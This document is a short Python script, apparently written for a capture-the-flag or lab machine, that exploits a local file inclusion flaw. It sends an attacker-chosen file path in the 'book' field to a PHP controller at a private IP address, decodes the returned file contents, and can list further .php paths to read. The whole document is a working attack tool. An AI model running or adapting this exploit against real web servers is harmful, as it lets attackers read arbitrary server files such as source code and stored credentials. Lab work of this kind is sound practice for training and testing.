import requests, re, sys

def lfi(page):
    data = {
        'book': page,
        'method': 1
    }

    resp = requests.post('http://10.129.200.109/includes/bookController.php', data=data)
    #import pdb; pdb.set_trace()
    try:
        return bytes(resp.text, "utf-8").decode('unicode_escape').strip('"').replace('\/', '/')
    except:
        return resp.text

if __name__ == "__main__":
    page = lfi(sys.argv[1])
    if len(sys.argv) == 3:
        files = re.findall(r'[a-zA-Z0-9\-\/]*\.php', page)
        for f in files:
            print(f)
    else:
        print(page)
